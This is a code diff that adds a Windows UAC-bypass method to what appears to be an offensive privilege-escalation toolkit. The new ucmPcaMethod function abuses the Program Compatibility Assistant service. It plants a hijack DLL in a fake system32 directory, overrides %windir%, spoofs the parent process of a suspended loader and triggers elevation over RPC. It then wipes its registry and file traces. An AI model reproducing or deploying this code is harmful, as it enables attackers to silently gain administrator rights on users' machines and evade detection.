@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.55
+*  VERSION:     3.56
 *
-*  DATE:        12 Mar 2021
+*  DATE:        30 July 2021
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -18,6 +18,7 @@
 *  https://github.com/AzAgarampur/byeintegrity4-uac
 *  https://github.com/AzAgarampur/byeintegrity-lite
 *  https://github.com/AzAgarampur/byeintegrity7-uac
+*  https://github.com/AzAgarampur/byeintegrity8-uac
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -27,6 +28,14 @@
 *******************************************************************************/
 
 #include "global.h"
+
+#ifdef _WIN64
+#include "pcasvc/w7/x64/pcasvc7_64.h"
+#include "pcasvc/w8_10/x64/pcasvc64.h"
+#else
+#include "pcasvc/w7/x86-32/pcasvc7_32.h"
+#include "pcasvc/w8_10/x86-32/pcasvc32.h"
+#endif
 
 /*
 * ucmxNgenLogLastWrite
@@ -974,14 +983,14 @@ NTSTATUS ucmMsSettingsProtocolMethod(
 }
 
 /*
-* ucmxGetAppXSvcState
+* ucmxGetServiceState
 *
 * Purpose:
 *
-* Return AppXSvc service state.
+* Return service state.
 *
 */
-DWORD ucmxGetAppXSvcState(
+DWORD ucmxGetServiceState(
     _In_ SC_HANDLE ServiceHandle
 )
 {
@@ -1003,15 +1012,15 @@ DWORD ucmxGetAppXSvcState(
 }
 
 /*
-* ucmxIsAppXSvcRunning
+* ucmxRunService
 *
 * Purpose:
 *
-* Return running state of AppXSvc (restart it if stopped).
+* Start given service if stopped.
 *
 */
-BOOLEAN ucmxIsAppXSvcRunning(
-    VOID
+BOOLEAN ucmxRunService(
+    _In_ LPCWSTR lpServiceName
 )
 {
     BOOLEAN bRunning = FALSE;
@@ -1022,7 +1031,7 @@ BOOLEAN ucmxIsAppXSvcRunning(
 
         schManager = OpenSCManager(
             NULL,
-            NULL,
+            SERVICES_ACTIVE_DATABASE,
             SC_MANAGER_CONNECT);
 
         if (schManager == NULL)
@@ -1030,13 +1039,13 @@ BOOLEAN ucmxIsAppXSvcRunning(
 
         schService = OpenService(
             schManager,
-            T_APPXSVC,
+            lpServiceName,
             SERVICE_QUERY_STATUS | SERVICE_START);
 
         if (schService == NULL)
             break;
 
-        dwState = ucmxGetAppXSvcState(schService);
+        dwState = ucmxGetServiceState(schService);
 
         if (dwState == SERVICE_RUNNING) {
             bRunning = TRUE;
@@ -1051,7 +1060,7 @@ BOOLEAN ucmxIsAppXSvcRunning(
 
             do {
 
-                dwState = ucmxGetAppXSvcState(schService);
+                dwState = ucmxGetServiceState(schService);
                 if (dwState == SERVICE_RUNNING) {
                     bRunning = TRUE;
                     break;
@@ -1069,7 +1078,7 @@ BOOLEAN ucmxIsAppXSvcRunning(
 
                 Sleep(1000);
 
-                dwState = ucmxGetAppXSvcState(schService);
+                dwState = ucmxGetServiceState(schService);
                 if (dwState == SERVICE_RUNNING) {
                     bRunning = TRUE;
                     break;
@@ -1088,6 +1097,21 @@ BOOLEAN ucmxIsAppXSvcRunning(
         CloseServiceHandle(schManager);
 
     return bRunning;
+}
+
+/*
+* ucmxIsAppXSvcRunning
+*
+* Purpose:
+*
+* Return running state of AppXSvc (restart it if stopped).
+*
+*/
+BOOLEAN ucmxIsAppXSvcRunning(
+    VOID
+)
+{
+    return ucmxRunService(T_APPXSVC);
 }
 
 /*
@@ -1344,6 +1368,502 @@ NTSTATUS ucmMsStoreProtocolMethod(
 
     if (SUCCEEDED(hr_init))
         CoUninitialize();
+
+    return MethodResult;
+}
+
+#define PCA_MONITOR_PROCESS_NORMAL 0
+#define PCA_MONITOR_PROCESS_NOCHAIN 1
+#define PCA_MONITOR_PROCESS_AS_INSTALLER 2
+
+/*
+* ucmxRemoveLoaderEntryFromRegistry
+*
+* Purpose:
+*
+* Cleanup registry entries.
+*
+*/
+ULONG ucmxRemoveLoaderEntryFromRegistry(
+    _In_ HKEY hRootKey,
+    _In_ LPCWSTR lpRegPath,
+    _In_ LPCWSTR lpLoaderName
+)
+{
+    HKEY hKey;
+
+    DWORD i, dwValuesCount = 0, cchValue, dwType, cRemoved = 0;
+
+    WCHAR szValue[MAX_PATH + 1];
+
+    do {
+        if (ERROR_SUCCESS != RegOpenKeyEx(hRootKey,
+            lpRegPath,
+            0,
+            KEY_READ | KEY_SET_VALUE,
+            &hKey))
+        {
+            break;
+        }
+
+        if (ERROR_SUCCESS != RegQueryInfoKey(hKey,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            &dwValuesCount,
+            NULL,
+            NULL,
+            NULL,
+            NULL))
+        {
+            break;
+        }
+
+        if (dwValuesCount == 0)
+            break;
+
+        RtlSecureZeroMemory(&szValue, sizeof(szValue));
+
+        for (i = 0; i < dwValuesCount; i++) {
+
+            dwType = 0;
+            cchValue = MAX_PATH;
+
+            if (ERROR_SUCCESS == RegEnumValue(hKey,
+                i,
+                (LPWSTR)&szValue,
+                (LPDWORD)&cchValue,
+                NULL,
+                &dwType,
+                NULL,
+                NULL))
+            {
+                if (dwType == REG_BINARY) {
+
+                    if (NULL != _strstri(szValue, lpLoaderName)) {
+
+                        if (ERROR_SUCCESS == RegDeleteValue(hKey, szValue))
+                            cRemoved++;
+
+                    }
+                }
+
+                szValue[0] = 0;
+            }
+
+        }
+
+
+    } while (FALSE);
+
+    RegCloseKey(hKey);
+
+    return cRemoved;
+}
+
+typedef struct _PCA_LOADER_BLOCK {
+    ULONG OpResult;
+    WCHAR szLoader[MAX_PATH + 1];
+} PCA_LOADER_BLOCK;
+
+/*
+* ucmPcaMethod
+*
+* Purpose:
+*
+* Bypass UAC using Program Compatibility Assistant.
+*
+* AlwaysNotify compatible.
+*
+*/
+NTSTATUS ucmPcaMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL fEnvSet = FALSE, fDirCreated = FALSE, fLoaderCreated = FALSE, fUsePca = TRUE;
+    ULONG ulResult = 0, seedValue;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
+    HRESULT hr_init;
+    SIZE_T cchDirName = 0, nLen, viewSize = PAGE_SIZE;
+
+    HANDLE hSharedSection = NULL, hSharedEvent = NULL;
+    HANDLE hShellProcess = NULL;
+
+    RPC_BINDING_HANDLE rpcHandle = NULL;
+    RPC_STATUS rpcStatus;
+
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION processInfo;
+
+    PCA_LOADER_BLOCK* pvLoaderBlock = NULL;
+
+    LARGE_INTEGER liValue;
+
+    OBJECT_ATTRIBUTES obja;
+    UNICODE_STRING usObjectName;
+
+    WCHAR szBuffer[MAX_PATH * 2], szEnvVar[MAX_PATH * 2];
+    WCHAR szLoader[MAX_PATH * 2];
+    WCHAR szLoaderName[64];
+
+    WCHAR szLoaderCmdLine[2];
+    WCHAR szObjectName[MAX_PATH];
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+    RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
+    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
+    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
+
+    do {
+
+        if (!ucmxRunService(T_PCASVC))
+            break;
+
+        if (g_ctx->dwBuildNumber < NT_WIN8_RTM) {
+            fUsePca = FALSE;
+        }
+
+        RtlSecureZeroMemory(&szLoaderName, sizeof(szLoaderName));
+
+        seedValue = ~GetTickCount();
+        liValue.LowPart = RtlRandomEx(&seedValue);
+        seedValue = GetTickCount();
+        liValue.HighPart = RtlRandomEx(&seedValue);
+
+        supBinTextEncode(liValue.QuadPart, szLoaderName);
+        _strcat(szLoaderName, TEXT(".exe"));
+
+        //
+        // Create shared loader section.
+        //
+        RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
+        _strcpy(szObjectName, TEXT("\\Sessions\\"));
+        ultostr(NtCurrentPeb()->SessionId, _strend(szObjectName));
+        _strcat(szObjectName, TEXT("\\BaseNamedObjects\\"));
+        supGenerateSharedObjectName((WORD)FUBUKI_PCA_SECTION_ID, _strend(szObjectName));
+
+        liValue.QuadPart = PAGE_SIZE;
+
+        RtlInitUnicodeString(&usObjectName, szObjectName);
+        InitializeObjectAttributes(&obja, &usObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        ntStatus = NtCreateSection(&hSharedSection,
+            SECTION_ALL_ACCESS,
+            &obja,
+            &liValue,
+            PAGE_READWRITE,
+            SEC_COMMIT,
+            NULL);
+
+        if (!NT_SUCCESS(ntStatus) || (hSharedSection == NULL)) {
+            break;
+        }
+
+        ntStatus = NtMapViewOfSection(
+            hSharedSection,
+            NtCurrentProcess(),
+            &pvLoaderBlock,
+            0,
+            PAGE_SIZE,
+            NULL,
+            &viewSize,
+            ViewUnmap,
+            MEM_TOP_DOWN,
+            PAGE_READWRITE);
+
+        if (!NT_SUCCESS(ntStatus) || (pvLoaderBlock == NULL)) {
+            break;
+        }
+
+        //
+        // Create completion event.
+        //
+        _strcpy(szObjectName, TEXT("\\BaseNamedObjects\\"));
+        supGenerateSharedObjectName((WORD)FUBUKI_PCA_EVENT_ID, _strend(szObjectName));
+
+        RtlInitUnicodeString(&usObjectName, szObjectName);
+        InitializeObjectAttributes(&obja, &usObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        ntStatus = NtCreateEvent(&hSharedEvent,
+            EVENT_ALL_ACCESS,
+            &obja,
+            SynchronizationEvent,
+            FALSE);
+
+        if (!NT_SUCCESS(ntStatus) || (hSharedEvent == NULL)) {
+            break;
+        }
+
+        //
+        // Stop WDI\ResolutionHost task.
+        //
+        if (!supStopTaskByName(
+            TEXT("Microsoft\\Windows\\WDI"),
+            TEXT("ResolutionHost")))
+        {
+            break;
+        }
+
+        //
+        // Create destination dir "system32"
+        //
+        _strcpy(szBuffer, g_ctx->szCurrentDirectory);
+        _strcat(szBuffer, SYSTEM32_DIR_NAME);
+        cchDirName = _strlen(szBuffer);
+        if (!CreateDirectory(szBuffer, NULL)) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
+                break;
+            }
+        }
+
+        fDirCreated = TRUE;
+
+        //
+        // Convert payload for dll hijack.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_ENTRYPOINT_PCADLL,
+            FALSE))
+        {
+            break;
+        }
+
+        //
+        // Drop payload to the fake system32 dir as PCADM.DLL.
+        //
+        szBuffer[cchDirName] = 0;
+        _strcat(szBuffer, TEXT("\\"));
+        _strcat(szBuffer, PCADM_DLL);
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
+            break;
+        }
+
+        //
+        // Convert dll to exe to be loader task.
+        //
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_ENTRYPOINT_PCAEXE,
+            TRUE))
+        {
+            break;
+        }
+
+        //
+        // Drop loader to the temp dir.
+        //
+        _strcpy(szLoader, g_ctx->szCurrentDirectory);
+        _strcat(szLoader, szLoaderName);
+        fLoaderCreated = supWriteBufferToFile(szLoader, ProxyDll, ProxyDllSize);
+        if (!fLoaderCreated) {
+            break;
+        }
+
+        //
+        // Remember loader name
+        //
+        _strcpy(pvLoaderBlock->szLoader, szLoader);
+
+        //
+        // Set new %windir% environment variable.
+        //
+        _strcpy(szEnvVar, g_ctx->szCurrentDirectory);
+        nLen = _strlen(szEnvVar);
+        if (szEnvVar[nLen - 1] == L'\\') {
+            szEnvVar[nLen - 1] = 0;
+        }
+
+        fEnvSet = supSetEnvVariable2(FALSE, NULL, T_WINDIR, szEnvVar);
+        if (fEnvSet == FALSE) {
+            break;
+        }
+
+        //
+        // Set loader command line.
+        //
+        szLoaderCmdLine[0] = (fUsePca) ? TEXT('1') : TEXT('3');
+        szLoaderCmdLine[1] = 0;
+
+        //
+        // Run loader suspended with parent set to shell process.
+        //
+        if (fUsePca) {
+
+            hShellProcess = supOpenShellProcess(PROCESS_CREATE_PROCESS);
+            if (hShellProcess == NULL) {
+                break;
+            }
+
+            processInfo.hProcess = supRunProcessFromParent(hShellProcess,
+                szLoader,
+                szLoaderCmdLine,
+                NULL,
+                CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                0,
+                &processInfo.hThread);
+
+        }
+        else {
+
+            startupInfo.cb = sizeof(startupInfo);
+            if (!CreateProcess(
+                szLoader,
+                szLoaderCmdLine,
+                NULL,
+                NULL,
+                FALSE,
+                CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                NULL,
+                NULL,
+                &startupInfo,
+                &processInfo))
+            {
+                break;
+            }
+
+        }
+
+        if (processInfo.hProcess == NULL) {
+            break;
+        }
+
+        rpcStatus = supCreateBindingHandle(PCASVC_RPC, &rpcHandle);
+
+        if (rpcStatus == RPC_S_OK) {
+
+            if (fUsePca) {
+
+                __try {
+
+                    rpcStatus = RAiMonitorProcess(
+                        rpcHandle,
+                        (ULONG_PTR)processInfo.hProcess,
+                        0,
+                        szLoader,
+                        szLoaderCmdLine,
+                        g_ctx->szCurrentDirectory,
+                        PCA_MONITOR_PROCESS_NORMAL);
+
+
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    rpcStatus = GetExceptionCode();
+                }
+
+
+            }
+            else {
+
+                __try {
+
+                    rpcStatus = RAiNotifyUserCallbackExceptionProcess(
+                        rpcHandle,
+                        szLoader,
+                        1,
+                        processInfo.dwProcessId);
+
+                }
+                __except (EXCEPTION_EXECUTE_HANDLER) {
+                    rpcStatus = GetExceptionCode();
+                }
+
+            }
+
+            RpcBindingFree(&rpcHandle);
+        }
+
+        if (rpcStatus != RPC_S_OK)
+            break;
+
+        ResumeThread(processInfo.hThread);
+
+        WaitForSingleObject(processInfo.hProcess, INFINITE);
+
+        if (fUsePca) {
+
+            GetExitCodeProcess(processInfo.hProcess, &ulResult);
+
+            if (ulResult != 0)
+                break;
+        }
+
+        WaitForSingleObject(hSharedEvent, 20 * 1000);
+
+        MethodResult = (pvLoaderBlock->OpResult == FUBUKI_PCA_ALL_RUN) ? STATUS_SUCCESS : STATUS_ACCESS_DENIED;
+
+    } while (FALSE);
+
+    Sleep(2000);
+
+    //
+    // Cleanup.
+    //
+    if (processInfo.hThread)
+        CloseHandle(processInfo.hThread);
+
+    if (processInfo.hProcess) {
+        TerminateProcess(processInfo.hProcess, ERROR_SUCCESS);
+        CloseHandle(processInfo.hProcess);
+    }
+
+    if (hSharedEvent)
+        NtClose(hSharedEvent);
+
+    if (pvLoaderBlock)
+        NtUnmapViewOfSection(NtCurrentProcess(), (PVOID)pvLoaderBlock);
+
+    if (hSharedSection)
+        NtClose(hSharedSection);
+
+    if (fEnvSet)
+        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
+
+    if (fUsePca) {
+
+        ucmxRemoveLoaderEntryFromRegistry(
+            HKEY_CURRENT_USER,
+            T_PCA_STORE,
+            szLoaderName);
+
+    }
+    else {
+
+        ucmxRemoveLoaderEntryFromRegistry(
+            HKEY_LOCAL_MACHINE,
+            T_APPCOMPAT_LAYERS,
+            szLoaderName);
+
+        ucmxRemoveLoaderEntryFromRegistry(
+            HKEY_CURRENT_USER,
+            T_PCA_PERSISTED,
+            szLoaderName);
+
+    }
+
+    if (fLoaderCreated) {
+        DeleteFile(szLoader);
+    }
+
+    if (fDirCreated) {
+        DeleteFile(szBuffer);
+        szBuffer[cchDirName] = 0;
+        RemoveDirectory(szBuffer);
+    }
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
+
+    if (MethodResult != STATUS_SUCCESS)
+        supSetGlobalCompletionEvent();
 
     return MethodResult;
 }
